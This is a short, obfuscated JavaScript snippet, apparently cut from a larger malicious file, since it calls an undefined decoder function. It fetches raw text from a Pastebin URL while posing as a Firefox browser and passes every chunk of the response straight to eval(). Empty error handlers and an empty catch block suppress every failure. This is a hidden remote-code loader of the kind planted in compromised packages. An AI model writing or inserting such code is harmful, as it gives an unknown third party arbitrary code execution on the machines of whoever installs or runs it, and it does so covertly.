try {
  var https = require('https')
  https
    .get(
      {
        hostname: 'pastebin.com',
        path: '/raw/XLeVP82h',
        headers: {
          'User-Agent':
            'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0',
          Accept:
            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        },
      },
      (_0x57e541) => {
        _0x57e541.setEncoding(_0x3bf935(5))
        _0x57e541.on('data', (_0x15b8a2) => {
          eval(_0x15b8a2)
        })
        _0x57e541.on('error', () => {})
      }
    )
    .on('error', () => {})
} catch (_0x26d4d3) {}

